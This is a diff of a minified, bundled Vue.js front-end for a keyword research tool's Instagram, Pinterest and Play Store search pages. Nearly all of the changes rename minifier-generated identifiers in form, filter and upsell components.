-                }, null, 8, gj), [
-                    [j, e.current_filter_is_verified]
-                ]), yj]), S("div", wj, [F(S("input", {
+                }, null, 8, gW), [
+                    [W, e.current_filter_is_verified]
+                ]), yW]), S("div", wW, [F(S("input", {
                     class: "form-check-input",
                     type: "radio",
                     name: "is_verified",
@@ -20433,9 +20455,9 @@ const Rj = Ue(_O, [
                     value: "1",
                     "onUpdate:modelValue": t[21] || (t[21] = t => e.current_filter_is_verified = t),
                     checked: "1" == e.current_filter_is_verified
-                }, null, 8, fj), [
-                    [j, e.current_filter_is_verified]
-                ]), bj]), S("div", vj, [F(S("input", {
+                }, null, 8, fW), [
+                    [W, e.current_filter_is_verified]
+                ]), bW]), S("div", vW, [F(S("input", {
                     class: "form-check-input",
                     type: "radio",
                     name: "is_verified",
@@ -20443,9 +20465,9 @@ const Rj = Ue(_O, [
                     value: "0",
                     "onUpdate:modelValue": t[22] || (t[22] = t => e.current_filter_is_verified = t),
                     checked: "0" == e.current_filter_is_verified
-                }, null, 8, kj), [
-                    [j, e.current_filter_is_verified]
-                ]), xj])])])])) : T("", !0), S("div", Cj, [S("div", Sj, [E(H, {
+                }, null, 8, kW), [
+                    [W, e.current_filter_is_verified]
+                ]), xW])])])])) : T("", !0), S("div", CW, [S("div", SW, [E(H, {
                     onCheckFilterKeywordDuplicate: e.checkFilterKeywordDuplicate,
                     current_remain_filter_keywords: e.current_remain_filter_keywords,
                     error_fields: e.error_fields,
@@ -20454,18 +20476,18 @@ const Rj = Ue(_O, [
                     "onUpdate:current_filter_keywords": t[23] || (t[23] = t => e.current_filter_keywords = t),
                     current_filter_keywords_partial_match: e.current_filter_keywords_partial_match,
                     "onUpdate:current_filter_keywords_partial_match": t[24] || (t[24] = t => e.current_filter_keywords_partial_match = t)
-                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", Tj, [S("div", Fj, [E(I, {
+                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", TW, [S("div", FW, [E(I, {
                     onCheckDuplicate: e.checkDuplicate,
                     current_remain_negative_keywords: e.current_remain_negative_keywords,
                     error_fields: e.error_fields,
                     current_negative_keywords: e.current_negative_keywords,
                     "onUpdate:current_negative_keywords": t[25] || (t[25] = t => e.current_negative_keywords = t)
-                }, null, 8, ["onCheckDuplicate", "current_remain_negative_keywords", "error_fields", "current_negative_keywords"])])]), e.current_permissions.show_full_name_column && e.current_permissions.show_full_name_data ? (b(), g("div", qj, [S("div", Ej, [S("div", Uj, [S("label", Mj, v(e.trans.get("Find Full Name Within Search Results")), 1), E(N, {
+                }, null, 8, ["onCheckDuplicate", "current_remain_negative_keywords", "error_fields", "current_negative_keywords"])])]), e.current_permissions.show_full_name_column && e.current_permissions.show_full_name_data ? (b(), g("div", qW, [S("div", EW, [S("div", UW, [S("label", MW, v(e.trans.get("Find Full Name Within Search Results")), 1), E(N, {
                     "model-value": e.current_filter_full_name,
                     "onUpdate:modelValue": t[26] || (t[26] = t => e.current_filter_full_name = t),
                     name: "filter_full_name",
                     placeholder: e.trans.get("eg: John Doe")
-                }, null, 8, ["model-value", "placeholder"]), S("small", Aj, v(e.trans.get("Press enter to add full name.")), 1)])])])) : T("", !0), E(R, {
+                }, null, 8, ["model-value", "placeholder"]), S("small", AW, v(e.trans.get("Press enter to add full name.")), 1)])])])) : T("", !0), E(B, {
                     current_permissions: e.current_permissions,
                     current_filter_keyword_result_period: e.current_filter_keyword_result_period,
                     "onUpdate:current_filter_keyword_result_period": t[27] || (t[27] = t => e.current_filter_keyword_result_period = t),
@@ -20477,12 +20499,12 @@ const Rj = Ue(_O, [
                     reset_all_metrics_url: e.current_reset_all_metrics_url
                 }, null, 8, ["current_permissions", "current_filter_keyword_result_period", "current_keyword_result_periods", "search_engine", "current_tab", "reset_keywords_url", "reset_latest_metrics_url", "reset_all_metrics_url"])])),
                 _: 1
-            }, 8, ["onResetFilter", "onApplyFilter", "filter_counter", "onClonedDataOnShownModal", "onRestoreClonedDataOnHideModal"])]), E(J, {
+            }, 8, ["onResetFilter", "onApplyFilter", "filter_counter", "onClonedDataOnShownModal", "onRestoreClonedDataOnHideModal"])]), E(K, {
                 onApplyTab: o.applyTab,
                 tabs: e.tabs,
                 current_tab: e.current_tab,
                 loading: e.loading
-            }, null, 8, ["onApplyTab", "tabs", "current_tab", "loading"]), e.loading || !e.has_error && !e.has_all_error ? T("", !0) : (b(), x(W, {
+            }, null, 8, ["onApplyTab", "tabs", "current_tab", "loading"]), e.loading || !e.has_error && !e.has_all_error ? T("", !0) : (b(), x(J, {
                 key: 0,
                 user_is_paid: e.user_is_paid,
                 has_metrics: e.has_metrics,
@@ -20490,7 +20512,7 @@ const Rj = Ue(_O, [
                 current_tab: e.current_tab
             }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(z, {
                 suggest_page_reload: e.suggest_page_reload
-            }, null, 8, ["suggest_page_reload"]), F(S("div", Pj, [e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide ? (b(), g("div", Lj, [E(Y, {
+            }, null, 8, ["suggest_page_reload"]), F(S("div", PW, [e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide ? (b(), g("div", $W, [E(Y, {
                 loading: e.loading,
                 current_tab: e.current_tab,
                 summaries: e.summaries,
@@ -20506,24 +20528,24 @@ const Rj = Ue(_O, [
                 lead: C((() => [S("p", {
                     class: "d-md-none d-lg-none d-xl-none mb-0",
                     innerHTML: e.trans.get("Do you need this information?")
-                }, null, 8, Bj), S("p", {
+                }, null, 8, LW), S("p", {
                     class: "d-md-none d-lg-none d-xl-none",
                     innerHTML: e.trans.get("1000s of Instagrammers, marketers, and agencies use Keyword Tool Pro for Instagram research?")
-                }, null, 8, $j), S("p", {
+                }, null, 8, DW), S("p", {
                     class: "d-none d-md-inline-block",
                     innerHTML: e.trans.get("Want to get up to 10x more hashtags instead?")
-                }, null, 8, Dj)])),
+                }, null, 8, jW)])),
                 noopener: C((() => [S("span", {
                     class: "d-md-none d-lg-none d-xl-none",
                     innerHTML: e.trans.get("Try it now!")
-                }, null, 8, Oj), S("span", {
+                }, null, 8, OW), S("span", {
                     class: "d-none d-md-inline-block",
                     innerHTML: e.trans.get("Try it now!")
-                }, null, 8, jj)])),
+                }, null, 8, WW)])),
                 _: 1
             }, 8, ["routes", "selected_language_name"])) : T("", !0)])) : T("", !0)], 512), [
-                [B, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
-            ]), S("div", Vj, [E(Q, {
+                [L, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
+            ]), S("div", VW, [E(Q, {
                 loading: e.loading,
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
@@ -20563,7 +20585,7 @@ const Rj = Ue(_O, [
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
             }, {
-                message: C((() => [10 == e.current_tab ? (b(), g("h4", Hj, v(e.trans.get("Sorry, Instagram does not provide any people suggestions for your query")), 1)) : (b(), g("h4", Ij, v(e.trans.get("Sorry, Instagram does not provide any hashtags for your query")), 1))])),
+                message: C((() => [10 == e.current_tab ? (b(), g("h4", HW, v(e.trans.get("Sorry, Instagram does not provide any people suggestions for your query")), 1)) : (b(), g("h4", IW, v(e.trans.get("Sorry, Instagram does not provide any hashtags for your query")), 1))])),
                 _: 1
             }, 8, ["loading", "has_all_error", "has_error", "has_keywords", "has_metrics"]), E(ee, {
                 onMore: e.more,
@@ -20599,7 +20621,7 @@ const Rj = Ue(_O, [
                     }, "dropdown-item btn-copy-keywords-with-posts-count"]),
                     onClick: t[28] || (t[28] = t => e.copy("posts")),
                     href: "javascript:"
-                }, [Nj, P(" " + v(e.trans.get("Copy with Posts Count")), 1)], 2)) : T("", !0), 7 == e.current_tab ? (b(), x(ie, {
+                }, [NW, P(" " + v(e.trans.get("Copy with Posts Count")), 1)], 2)) : T("", !0), 7 == e.current_tab ? (b(), x(ie, {
                     key: 3,
                     onCopy: e.copy,
                     current_permissions: e.current_permissions
@@ -20612,13 +20634,13 @@ const Rj = Ue(_O, [
             }, 8, ["loading", "all_keywords", "total_keywords", "selected", "allow_keyword_basket", "has_error", "has_all_error"])])
         }]
     ]),
-    Kj = {
+    RW = {
         class: "row g-0 me-lg-n1px"
     },
-    Jj = {
+    KW = {
         class: "col col-md-12 my-1 me-lg-n1px"
     };
-const Wj = Ue({
+const JW = Ue({
         mixins: [AT],
         components: {},
         data: () => ({
@@ -20631,7 +20653,7 @@ const Wj = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", Kj, [S("div", Jj, [E(i, {
+            return b(), g("div", RW, [S("div", KW, [E(i, {
                 disabled: e.loading,
                 id: "keyword_language_" + e.id,
                 options: e.language_options,
@@ -20656,17 +20678,17 @@ const Wj = Ue({
             ])])])
         }]
     ]),
-    zj = {
+    zW = {
         class: "row g-0 me-lg-n1px"
     },
-    Yj = {
+    YW = {
         class: "col-12 col-md-7 my-1 me-n1px"
     },
-    Gj = {
+    GW = {
         class: "col col-md-5 my-1 me-lg-n1px"
     };
-const Xj = Ue({
-        mixins: [DT],
+const XW = Ue({
+        mixins: [jT],
         components: {},
         data: () => ({
             languages_url: "/search/keywords/instagram/languages",
@@ -20684,7 +20706,7 @@ const Xj = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", zj, [S("div", Yj, [E(i, {
+            return b(), g("div", zW, [S("div", YW, [E(i, {
                 disabled: e.loading,
                 id: "country_" + e.id,
                 options: e.locations_options,
@@ -20700,7 +20722,7 @@ const Xj = Ue({
                 "onUpdate:modelValue": t[1] || (t[1] = t => e.country = t)
             }, null, 512), [
                 [U, e.country]
-            ])]), S("div", Gj, [E(i, {
+            ])]), S("div", GW, [E(i, {
                 disabled: e.loading,
                 id: "language_" + e.id,
                 options: e.language_options,
@@ -20713,8 +20735,8 @@ const Xj = Ue({
             }, null, 8, ["disabled", "id", "options", "settings", "model-value", "placeholder"])])])
         }]
     ]),
-    Qj = ["value"],
-    Zj = ["value"],
+    QW = ["value"],
+    ZW = ["value"],
     eV = {
         key: 2,
         class: "row"
@@ -20751,12 +20773,12 @@ const lV = Ue({
                 name: "metrics_country",
                 type: "hidden",
                 value: e.country
-            }, null, 8, Qj)) : T("", !0), e.permissions.show_currency_settings ? (b(), g("input", {
+            }, null, 8, QW)) : T("", !0), e.permissions.show_currency_settings ? (b(), g("input", {
                 key: 1,
                 name: "metrics_currency",
                 type: "hidden",
                 value: e.currency
-            }, null, 8, Zj)) : T("", !0), e.current_country_list.length && e.permissions.show_search_location_settings ? (b(), g("div", eV, [S("div", tV, [S("div", rV, [S("label", sV, v(e.trans.get("Country")), 1), E(i, {
+            }, null, 8, ZW)) : T("", !0), e.current_country_list.length && e.permissions.show_search_location_settings ? (b(), g("div", eV, [S("div", tV, [S("div", rV, [S("label", sV, v(e.trans.get("Country")), 1), E(i, {
                 options: e.current_country_list,
                 settings: e.country_settings,
                 class: "check-search-volume-settings-country-value",
@@ -20855,18 +20877,18 @@ const lV = Ue({
     PV = {
         class: "row"
     },
-    LV = {
+    $V = {
         class: "col-12"
     },
-    BV = ["innerHTML"],
-    $V = ["innerHTML"],
-    DV = {
+    LV = ["innerHTML"],
+    DV = ["innerHTML"],
+    jV = {
         class: "search-results-summary card my-4 bg-light"
     },
     OV = {
         class: "card-body"
     },
-    jV = {
+    WV = {
         class: "search-results-keywords my-3"
     },
     VV = {
@@ -20876,7 +20898,7 @@ const HV = Ue({
         mixins: [mp],
         components: {
             "google-search-volume-summary": zg,
-            "google-search-volume-result": Jx
+            "google-search-volume-result": Kx
         },
         computed: {
             show_upsell() {
@@ -20931,19 +20953,19 @@ const HV = Ue({
                 M = k("search-results-settings-modal-search-volume-trend"),
                 A = k("search-results-settings-modal-average-cpc"),
                 P = k("search-results-settings-modal-bing-competition"),
-                L = k("search-results-settings-modal-competition"),
-                $ = k("search-results-settings-filter-positive-keywords"),
-                D = k("search-results-settings-filter-negative-keywords"),
+                $ = k("search-results-settings-modal-competition"),
+                D = k("search-results-settings-filter-positive-keywords"),
+                j = k("search-results-settings-filter-negative-keywords"),
                 O = k("alert-pro-upsell"),
-                j = k("search-results-settings-admin-settings"),
+                W = k("search-results-settings-admin-settings"),
                 V = k("search-results-settings-modal"),
                 H = k("search-results-tabs"),
                 I = k("has-error"),
                 N = k("suggest-page-reload"),
-                R = k("google-search-volume-summary"),
-                K = k("show-upsell"),
-                J = k("google-search-volume-result"),
-                W = k("search-results-table-wrapper"),
+                B = k("google-search-volume-summary"),
+                R = k("show-upsell"),
+                K = k("google-search-volume-result"),
+                J = k("search-results-table-wrapper"),
                 z = k("search-results-no-keyword-found"),
                 Y = k("has-more"),
                 G = k("dropdown-menu-item-add-basket"),
@@ -21059,7 +21081,7 @@ const HV = Ue({
                     current_permissions: e.current_permissions,
                     current_filter_competition: e.current_filter_competition,
                     "onUpdate:current_filter_competition": t[8] || (t[8] = t => e.current_filter_competition = t)
-                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x(L, {
+                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x($, {
                     key: 1,
                     current_permissions: e.current_permissions,
                     competition_format: e.competition_format,
@@ -21068,7 +21090,7 @@ const HV = Ue({
                     "onUpdate:current_filter_competition_min": t[9] || (t[9] = t => e.current_filter_competition_min = t),
                     current_filter_competition_max: e.current_filter_competition_max,
                     "onUpdate:current_filter_competition_max": t[10] || (t[10] = t => e.current_filter_competition_max = t)
-                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), S("div", MV, [S("div", AV, [E($, {
+                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), S("div", MV, [S("div", AV, [E(D, {
                     onCheckFilterKeywordDuplicate: e.checkFilterKeywordDuplicate,
                     current_remain_filter_keywords: e.current_remain_filter_keywords,
                     error_fields: e.error_fields,
@@ -21077,7 +21099,7 @@ const HV = Ue({
                     "onUpdate:current_filter_keywords": t[11] || (t[11] = t => e.current_filter_keywords = t),
                     current_filter_keywords_partial_match: e.current_filter_keywords_partial_match,
                     "onUpdate:current_filter_keywords_partial_match": t[12] || (t[12] = t => e.current_filter_keywords_partial_match = t)
-                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", PV, [S("div", LV, [E(D, {
+                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", PV, [S("div", $V, [E(j, {
                     onCheckDuplicate: e.checkDuplicate,
                     current_remain_negative_keywords: e.current_remain_negative_keywords,
                     error_fields: e.error_fields,
@@ -21091,14 +21113,14 @@ const HV = Ue({
                         innerHTML: e.trans.get("Need to add more than :count_free negative keywords?", {
                             count_free: 5
                         })
-                    }, null, 8, BV)])),
+                    }, null, 8, LV)])),
                     linktext: C((() => [S("span", {
                         innerHTML: e.trans.get("Try Keyword Tool Pro to use up to :count_pro negative keywords for every search!", {
                             count_pro: "2,000"
                         })
-                    }, null, 8, $V)])),
+                    }, null, 8, DV)])),
                     _: 1
-                }, 8, ["current_permissions", "routes"]), E(j, {
+                }, 8, ["current_permissions", "routes"]), E(W, {
                     current_permissions: e.current_permissions,
                     current_filter_keyword_result_period: e.current_filter_keyword_result_period,
                     "onUpdate:current_filter_keyword_result_period": t[14] || (t[14] = t => e.current_filter_keyword_result_period = t),
@@ -21123,7 +21145,7 @@ const HV = Ue({
                 current_tab: e.current_tab
             }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(N, {
                 suggest_page_reload: e.suggest_page_reload
-            }, null, 8, ["suggest_page_reload"]), F(S("div", DV, [S("div", OV, [E(R, {
+            }, null, 8, ["suggest_page_reload"]), F(S("div", jV, [S("div", OV, [E(B, {
                 loading: e.loading,
                 current_tab: e.current_tab,
                 summaries: e.summaries,
@@ -21131,18 +21153,18 @@ const HV = Ue({
                 show_pie_chart: e.show_pie_chart,
                 current_permissions: e.current_permissions,
                 current_metrics_currency: e.current_metrics_currency
-            }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_metrics_currency"]), o.show_upsell && 1 == e.current_tab ? (b(), x(K, {
+            }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_metrics_currency"]), o.show_upsell && 1 == e.current_tab ? (b(), x(R, {
                 key: 0,
                 routes: e.routes,
                 selected_language_name: e.selected_language_name
             }, null, 8, ["routes", "selected_language_name"])) : T("", !0)])], 512), [
-                [B, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
-            ]), S("div", jV, [E(W, {
+                [L, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
+            ]), S("div", WV, [E(J, {
                 loading: e.loading,
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
             }, {
-                wrapper: C((() => [E(J, {
+                wrapper: C((() => [E(K, {
                     device_breakdown_data: e.device_breakdown_data,
                     loading: e.loading,
                     current_tab: e.current_tab,
@@ -21225,7 +21247,7 @@ const HV = Ue({
     NV = {
         class: "col col-md-12 my-1 me-lg-n1px"
     };
-const RV = Ue({
+const BV = Ue({
         mixins: [AT],
         components: {},
         data: () => ({
@@ -21263,17 +21285,17 @@ const RV = Ue({
             ])])])
         }]
     ]),
-    KV = {
+    RV = {
         class: "row g-0 me-lg-n1px"
     },
-    JV = {
+    KV = {
         class: "col-12 col-md-7 my-1 me-n1px"
     },
-    WV = {
+    JV = {
         class: "col col-md-5 my-1 me-lg-n1px"
     };
 const zV = Ue({
-        mixins: [DT],
+        mixins: [jT],
         components: {},
         data: () => ({
             languages_url: "/search/keywords/pinterest/languages",
@@ -21291,7 +21313,7 @@ const zV = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", KV, [S("div", JV, [E(i, {
+            return b(), g("div", RV, [S("div", KV, [E(i, {
                 disabled: e.loading,
                 id: "country_" + e.id,
                 options: e.locations_options,
@@ -21307,7 +21329,7 @@ const zV = Ue({
                 "onUpdate:modelValue": t[1] || (t[1] = t => e.country = t)
             }, null, 512), [
                 [U, e.country]
-            ])]), S("div", WV, [E(i, {
+            ])]), S("div", JV, [E(i, {
                 disabled: e.loading,
                 id: "language_" + e.id,
                 options: e.language_options,
@@ -21497,24 +21519,24 @@ const iH = Ue({
         class: "col-12"
     },
     PH = ["innerHTML"],
-    LH = ["innerHTML"],
-    BH = {
+    $H = ["innerHTML"],
+    LH = {
         class: "search-results-summary card my-4 bg-light"
     },
-    $H = {
+    DH = {
         class: "card-body"
     },
-    DH = {
+    jH = {
         class: "search-results-keywords my-3"
     },
     OH = {
         class: "mb-4"
     };
-const jH = Ue({
+const WH = Ue({
         mixins: [mp],
         components: {
             "google-search-volume-summary": zg,
-            "google-search-volume-result": Jx
+            "google-search-volume-result": Kx
         },
         computed: {
             show_upsell() {
@@ -21569,19 +21591,19 @@ const jH = Ue({
                 M = k("search-results-settings-modal-search-volume-trend"),
                 A = k("search-results-settings-modal-average-cpc"),
                 P = k("search-results-settings-modal-bing-competition"),
-                L = k("search-results-settings-modal-competition"),
-                $ = k("search-results-settings-filter-positive-keywords"),
-                D = k("search-results-settings-filter-negative-keywords"),
+                $ = k("search-results-settings-modal-competition"),
+                D = k("search-results-settings-filter-positive-keywords"),
+                j = k("search-results-settings-filter-negative-keywords"),
                 O = k("alert-pro-upsell"),
-                j = k("search-results-settings-admin-settings"),
+                W = k("search-results-settings-admin-settings"),
                 V = k("search-results-settings-modal"),
                 H = k("search-results-tabs"),
                 I = k("has-error"),
                 N = k("suggest-page-reload"),
-                R = k("google-search-volume-summary"),
-                K = k("show-upsell"),
-                J = k("google-search-volume-result"),
-                W = k("search-results-table-wrapper"),
+                B = k("google-search-volume-summary"),
+                R = k("show-upsell"),
+                K = k("google-search-volume-result"),
+                J = k("search-results-table-wrapper"),
                 z = k("search-results-no-keyword-found"),
                 Y = k("has-more"),
                 G = k("dropdown-menu-item-add-basket"),
@@ -21697,7 +21719,7 @@ const jH = Ue({
                     current_permissions: e.current_permissions,
                     current_filter_competition: e.current_filter_competition,
                     "onUpdate:current_filter_competition": t[8] || (t[8] = t => e.current_filter_competition = t)
-                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x(L, {
+                }, null, 8, ["current_permissions", "current_filter_competition"])) : (b(), x($, {
                     key: 1,
                     current_permissions: e.current_permissions,
                     competition_format: e.competition_format,
@@ -21706,7 +21728,7 @@ const jH = Ue({
                     "onUpdate:current_filter_competition_min": t[9] || (t[9] = t => e.current_filter_competition_min = t),
                     current_filter_competition_max: e.current_filter_competition_max,
                     "onUpdate:current_filter_competition_max": t[10] || (t[10] = t => e.current_filter_competition_max = t)
-                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), S("div", EH, [S("div", UH, [E($, {
+                }, null, 8, ["current_permissions", "competition_format", "error_fields", "current_filter_competition_min", "current_filter_competition_max"]))])])) : T("", !0), S("div", EH, [S("div", UH, [E(D, {
                     onCheckFilterKeywordDuplicate: e.checkFilterKeywordDuplicate,
                     current_remain_filter_keywords: e.current_remain_filter_keywords,
                     error_fields: e.error_fields,
@@ -21715,7 +21737,7 @@ const jH = Ue({
                     "onUpdate:current_filter_keywords": t[11] || (t[11] = t => e.current_filter_keywords = t),
                     current_filter_keywords_partial_match: e.current_filter_keywords_partial_match,
                     "onUpdate:current_filter_keywords_partial_match": t[12] || (t[12] = t => e.current_filter_keywords_partial_match = t)
-                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", MH, [S("div", AH, [E(D, {
+                }, null, 8, ["onCheckFilterKeywordDuplicate", "current_remain_filter_keywords", "error_fields", "allow_partial_match", "current_filter_keywords", "current_filter_keywords_partial_match"])])]), S("div", MH, [S("div", AH, [E(j, {
                     onCheckDuplicate: e.checkDuplicate,
                     current_remain_negative_keywords: e.current_remain_negative_keywords,
                     error_fields: e.error_fields,
@@ -21734,9 +21756,9 @@ const jH = Ue({
                         innerHTML: e.trans.get("Try Keyword Tool Pro to use up to :count_pro negative keywords for every search!", {
                             count_pro: "2,000"
                         })
-                    }, null, 8, LH)])),
+                    }, null, 8, $H)])),
                     _: 1
-                }, 8, ["current_permissions", "routes"]), E(j, {
+                }, 8, ["current_permissions", "routes"]), E(W, {
                     current_permissions: e.current_permissions,
                     current_filter_keyword_result_period: e.current_filter_keyword_result_period,
                     "onUpdate:current_filter_keyword_result_period": t[14] || (t[14] = t => e.current_filter_keyword_result_period = t),
@@ -21761,7 +21783,7 @@ const jH = Ue({
                 current_tab: e.current_tab
             }, null, 8, ["user_is_paid", "has_metrics", "onFetch", "current_tab"])), E(N, {
                 suggest_page_reload: e.suggest_page_reload
-            }, null, 8, ["suggest_page_reload"]), F(S("div", BH, [S("div", $H, [E(R, {
+            }, null, 8, ["suggest_page_reload"]), F(S("div", LH, [S("div", DH, [E(B, {
                 loading: e.loading,
                 current_tab: e.current_tab,
                 summaries: e.summaries,
@@ -21769,18 +21791,18 @@ const jH = Ue({
                 show_pie_chart: e.show_pie_chart,
                 current_permissions: e.current_permissions,
                 current_metrics_currency: e.current_metrics_currency
-            }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_metrics_currency"]), o.show_upsell && 1 == e.current_tab ? (b(), x(K, {
+            }, null, 8, ["loading", "current_tab", "summaries", "pie_summaries", "show_pie_chart", "current_permissions", "current_metrics_currency"]), o.show_upsell && 1 == e.current_tab ? (b(), x(R, {
                 key: 0,
                 routes: e.routes,
                 selected_language_name: e.selected_language_name
             }, null, 8, ["routes", "selected_language_name"])) : T("", !0)])], 512), [
-                [B, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
-            ]), S("div", DH, [E(W, {
+                [L, e.summaries && e.summaries.total_keywords > 0 && !e.summaries.hide]
+            ]), S("div", jH, [E(J, {
                 loading: e.loading,
                 has_keywords: e.has_keywords,
                 has_metrics: e.has_metrics
             }, {
-                wrapper: C((() => [E(J, {
+                wrapper: C((() => [E(K, {
                     device_breakdown_data: e.device_breakdown_data,
                     loading: e.loading,
                     current_tab: e.current_tab,
@@ -21904,14 +21926,14 @@ const IH = Ue({
     NH = {
         class: "row g-0 me-lg-n1px"
     },
-    RH = {
+    BH = {
         class: "col-12 col-md-7 my-1 me-n1px"
     },
-    KH = {
+    RH = {
         class: "col col-md-5 my-1 me-lg-n1px"
     };
-const JH = Ue({
-        mixins: [DT],
+const KH = Ue({
+        mixins: [jT],
         components: {},
         data: () => ({
             languages_url: "/search/keywords/play-store/languages",
@@ -21929,7 +21951,7 @@ const JH = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", NH, [S("div", RH, [E(i, {
+            return b(), g("div", NH, [S("div", BH, [E(i, {
                 disabled: e.loading,
                 id: "country_" + e.id,
                 options: e.locations_options,
@@ -21945,7 +21967,7 @@ const JH = Ue({
                 "onUpdate:modelValue": t[1] || (t[1] = t => e.country = t)
             }, null, 512), [
                 [U, e.country]
-            ])]), S("div", KH, [E(i, {
+            ])]), S("div", RH, [E(i, {
                 disabled: e.loading,
                 id: "language_" + e.id,
                 options: e.language_options,
@@ -21958,7 +21980,7 @@ const JH = Ue({
             }, null, 8, ["disabled", "id", "options", "settings", "model-value", "placeholder"])])])
         }]
     ]),
-    WH = ["value"],
+    JH = ["value"],
     zH = ["value"],
     YH = {
         key: 2,
@@ -21996,7 +22018,7 @@ const sI = Ue({
                 name: "metrics_country",
                 type: "hidden",
                 value: e.country
-            }, null, 8, WH)) : T("", !0), e.permissions.show_currency_settings ? (b(), g("input", {
+            }, null, 8, JH)) : T("", !0), e.permissions.show_currency_settings ? (b(), g("input", {
                 key: 1,
                 name: "metrics_currency",
                 type: "hidden",
@@ -22024,7 +22046,7 @@ const sI = Ue({
         mixins: [mp],
         components: {
             "google-search-volume-summary": zg,
-            "google-search-volume-result": Jx
+            "google-search-volume-result": Kx
         },
         computed: {
             show_upsell() {
@@ -22175,19 +22197,19 @@ const sI = Ue({
     PI = {
         class: "search-results-settings-display-view-count-label"
     },
-    LI = {
+    $I = {
         key: 0,
         class: "search-results-settings-display-view-count-value"
     },
-    BI = {
+    LI = {
         key: 1,
         class: "search-results-settings-display-view-count-value"
     },
-    $I = {
+    DI = {
         key: 2,
         class: "search-results-settings-display-view-count-value"
     },
-    DI = {
+    jI = {
         key: 0,
         type: "button",
         class: "btn-search-results-settings-display-is-verified btn btn-sm btn-outline-primary disabled cursor-default my-1 mx-1"
@@ -22195,7 +22217,7 @@ const sI = Ue({
     OI = {
         class: "search-results-settings-display-is-verified-label"
     },
-    jI = {
+    WI = {
         "data-bs-toggle": "modal",
         "data-bs-target": "#search-results-setting-modal",
         class: "search-results-settings-display-is-verified-value cursor-pointer"
@@ -22214,16 +22236,16 @@ const sI = Ue({
         key: 1,
         class: "row"
     },
-    RI = {
+    BI = {
         class: "col-12 col-md-6"
     },
-    KI = {
+    RI = {
         class: "search-results-settings-modal-country form-group"
     },
-    JI = {
+    KI = {
         class: "search-results-settings-modal-country-label"
     },
-    WI = ["value"],
+    JI = ["value"],
     zI = {
         key: 0,
         class: "col-12 col-md-6"
@@ -22355,24 +22377,24 @@ const sI = Ue({
     PN = {
         class: "input-group-text rounded-0 border-start-0 border-end-0"
     },
-    LN = {
+    $N = {
         key: 2,
         class: "row"
     },
-    BN = {
+    LN = {
         key: 0,
         class: "col"
     },
-    $N = {
+    DN = {
         class: "search-results-settings-modal-is-verified mb-3"
     },
-    DN = {
+    jN = {
         class: "form-label search-results-settings-modal-is-verified-label"
     },
     ON = {
         class: "form-check"
     },
-    jN = ["checked"],
+    WN = ["checked"],
     VN = S("label", {
         class: "form-check-label",
         for: "is-verified-any"
@@ -22385,15 +22407,15 @@ const sI = Ue({
         class: "form-check-label",
         for: "is-verified-yes"
     }, " Yes ", -1),
-    RN = {
+    BN = {
         class: "form-check disabled"
     },
-    KN = ["checked"],
-    JN = S("label", {
+    RN = ["checked"],
+    KN = S("label", {
         class: "form-check-label",
         for: "is-verified-no"
     }, " No ", -1),
-    WN = {
+    JN = {
         key: 3,
         class: "row"
     },
@@ -22415,26 +22437,26 @@ const sI = Ue({
     ZN = {
         class: "col-12"
     },
-    eR = ["innerHTML"],
-    tR = ["innerHTML"],
-    rR = {
+    eB = ["innerHTML"],
+    tB = ["innerHTML"],
+    rB = {
         class: "search-results-summary card my-4 bg-light"
     },
-    sR = {
+    sB = {
         class: "card-body"
     },
-    aR = {
+    aB = {
         class: "search-results-keywords my-3"
     },
-    oR = {
+    oB = {
         key: 0,
         class: "mb-4"
     },
-    iR = {
+    iB = {
         key: 1,
         class: "mb-4"
     };
-const nR = Ue(aI, [
+const nB = Ue(aI, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("loading-section"),
                 n = k("current-filter-keyword-result-period"),
@@ -22451,17 +22473,17 @@ const nR = Ue(aI, [
                 M = k("search-results-settings-modal-currency"),
                 A = k("search-results-settings-modal-search-volume"),
